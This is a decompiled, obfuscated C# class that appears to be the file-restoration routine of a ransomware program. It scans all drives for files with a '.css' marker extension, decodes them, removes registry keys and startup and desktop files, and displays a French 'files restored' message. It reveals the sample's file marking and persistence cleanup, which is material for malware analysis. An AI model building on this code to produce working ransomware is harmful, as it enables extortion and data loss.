using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace FL;

public class SearchEncodedFiles
{
	private delegate void Delegate0(string x);

	private delegate void Delegate1();

	public string Dossiersystem;

	public SearchEncodedFiles()
	{
		Class8.t3hvLuccnmfIO();
		Class8.t3hvLuccnmfIO();
		base._002Ector();
		Dossiersystem = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
	}

	public void ChercherFichiers(DirectoryInfo directoryInfo_0, string[] string_0)
	{
		try
		{
			for (int i = 0; i < string_0.Length; i = checked(i + 1))
			{
				FileInfo[] files = directoryInfo_0.GetFiles("*.*");
				FileInfo[] array = files;
				foreach (FileInfo fileInfo in array)
				{
					if (fileInfo.FullName.EndsWith(".css"))
					{
						ChangeLabel(fileInfo.FullName);
						DecodeFiles.Decode_File(fileInfo.FullName);
					}
				}
			}
			DirectoryInfo[] directories = directoryInfo_0.GetDirectories();
			foreach (DirectoryInfo directoryInfo_ in directories)
			{
				ChercherFichiers(directoryInfo_, string_0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void ChangeLabel(string string_0)
	{
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Form1 form = (Form1)(object)Application.get_OpenForms().get_Item(0);
			((Control)form).Invoke((Delegate)new Delegate0(ProgressChanging), new object[1] { string_0 });
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	public void ProgressChanging(string string_0)
	{
		Class3.Class4_0.Form1.AvLabel1.String2 = string_0;
	}

	public void method_0()
	{
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.IsReady)
			{
				ChercherFichiers(new DirectoryInfo(driveInfo.RootDirectory.ToString()), new string[5] { "JPG", "BMP", "PNG", "MP4", "AVI" });
			}
		}
		try
		{
			StopTimer();
			KeyRegistration.RegDelete();
			KeyRegistration.DeleteFois();
			File.Delete(Class3.Class4_0.Form1.FichierDesktop);
			File.Delete(Class3.Class4_0.Form1.FichierStartup);
			File.Delete(Application.get_ExecutablePath() + ".css");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	public void StopTimer()
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Form1 form = (Form1)(object)Application.get_OpenForms().get_Item(0);
			((Control)form).Invoke((Delegate)new Delegate1(DescriptionStop));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	public void DescriptionStop()
	{
		Class3.Class4_0.Form1.PictureBox1.set_Image((Image)(object)Class1.smethod_5());
		Class3.Class4_0.Form1.vmethod_0().Stop();
		Class3.Class4_0.Form1.AvLabel1.String2 = "Tous vos fichiers en été restauré avec succès !";
		((Control)Class3.Class4_0.Form1.AvWindowButton1).set_Visible(true);
	}
}
